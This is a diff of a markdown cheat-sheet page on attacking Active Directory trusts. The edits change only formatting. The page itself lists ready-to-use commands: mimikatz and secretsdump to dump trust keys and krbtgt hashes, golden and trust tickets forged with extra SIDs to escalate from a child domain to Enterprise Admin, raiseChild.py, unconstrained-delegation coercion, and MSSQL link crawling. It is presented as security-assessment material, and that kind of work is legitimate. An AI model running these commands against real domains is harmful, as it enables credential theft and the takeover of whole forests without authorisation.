@@ -2,6 +2,7 @@
 title: "Trusts"
 description: "Trusts techniques and commands for Active Directory security assessment."
 ---
+# Trusts
 ## Enumeration
 - `nltest.exe /trusted_domains`
 - `([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()`
@@ -15,20 +16,20 @@ description: "Trusts techniques and commands for Active Directory security asses
   - `lookupsid.py -domain-sids <domain>/<user>:<password>'@<dc> 0 lookupsid.py -domain-sids <domain>/<user>:<password>'@<target_dc> 0`
 
 ## Child->Parent
-- Trust Key >>> PassTheTicket
+- Trust Key *PassTheTicket*{: .highlight}
   - `mimikatz lsadump::trust /patch`
     - `mimikatz kerberos::golden /user:Administrator /domain:<domain> /sid:<domain_sid> /aes256:<trust_key_aes256> /sids:<target_domain_sid>-519 /service:krbtgt /target:<target_domain> /ptt`
   - `secretsdump.py -just-dc-user '<parent_domain>$'   <domain>/<user>:<password>@<dc_ip>`
     - `ticketer.py -nthash <trust_key> -domain-sid <child_sid> -domain <child_domain> -extra-sid <parent_sid>-519 -spn krbtgt/<parent_domain> trustfakeuser`
 
-- Golden Ticket >>> PassTheTicket
+- Golden Ticket *PassTheTicket*{: .highlight}
   - `mimikatz lsadump::dcsync /domain:<domain> /user:<domain>\krbtgt`
     - `mimikatz kerberos::golden /user:Administrator /krbtgt:<HASH_KRBTGT> /domain:<domain> /sid:<user_sid> /sids:<RootDomainSID-519> /ptt`
   - `raiseChild.py <child_domain>/<user>:<password>`
   - `ticketer.py -nthash <child_krbtgt_hash> -domain-sid <child_sid> -domain <child_domain> -extra-sid <parent_sid>-519 goldenuser`
 
 - Unconstrained delegation
-  - coerce parent_dc on child_dc domain >>> unconstrained delegation
+  - coerce parent_dc on child_dc domain *unconstrained delegation*{: .highlight}
 
 ## Parent->Child
 - same as Child to parent
@@ -36,13 +37,13 @@ description: "Trusts techniques and commands for Active Directory security asses
 ## External Trust 
 - DomainA <--> DomainB trust (B trust A, A trust B)
   - from A to B FOREST_TRANSITIVE
-    - password reuse >>> lat move (creds/pth/...)
-    - Foreign group and users >>> ACL
+    - password reuse *lat move (creds/pth/...)*{: .highlight}
+    - Foreign group and users *ACL*{: .highlight}
       - Users with foreign Domain Group Membership
         - `MATCH p=(n:User {domain:"<DOMAIN.FQDN>"})-[:MemberOf]->(m:Group) WHERE m.domain<>n.domain RETURN p`
       - Group with foreign Domain Group Membership
         - `MATCH p=(n:Group {domain:"<DOMAIN.FQDN>"})-[:MemberOf]->(m:Group) WHERE m.domain<>n.domain RETURN p`
-    - SID History on B >>> PassTheTicket
+    - SID History on B *PassTheTicket*{: .highlight}
       - Golden ticket
         - `mimikatz lsadump::dcsync /domain:<domain> /user:<domain>\krbtgt`
           - `mimikatz kerberos::golden /user:Administrator /krbtgt:<HASH_KRBTGT> /domain:<domain> /sid:<user_sid> /sids:<RootDomainSID>-<GROUP_SID_SUP_1000> /ptt`
@@ -50,18 +51,18 @@ description: "Trusts techniques and commands for Active Directory security asses
       - Trust ticket
         - `secretsdump.py -just-dc-user '<domainB>' <domainA>/<user>:'<password>'@<dc_a>`
           - `ticketer.py -nthash <trust_hash> -domain-sid <sid_a> -domain <domain_a> -extra-sid <domain_b_sid>-<group_sid sup 1000> -spn krbtgt/<domain_a> fakeuser`
-    - ADCS abuse >>> ADCS
+    - ADCS abuse *ADCS*{: .highlight}
   - from A to B is FOREST_TRANSITIVE|TREAT_AS_EXTERNAL
       - Unconstrained delegation
-        - coerce dc_b on dc_a >>> unconstrained delegation
+        - coerce dc_b on dc_a *unconstrained delegation*{: .highlight}
         
 - DomainA <-- DomainB trust (B trust A / A access B)
   - Same as double trust, but no unconstrained delegation as B can't connect to A
 
 - DomainA --> DomainB trust (A trust B / B access A)
-  - password reuse >>> lat move (creds/pth/...)
+  - password reuse *lat move (creds/pth/...)*{: .highlight}
 
-## Mssql links >>> MSSQL
+## Mssql links *MSSQL*{: .highlight}
 - MSSQL trusted links doesn't care of trust link
   - `Get-SQLServerLinkCrawl -username <user> -password <pass> -Verbose -Instance <sql_instance>`
   - `mssqlclient.py -windows-auth <domain>/<user>:<password>@<ip>`
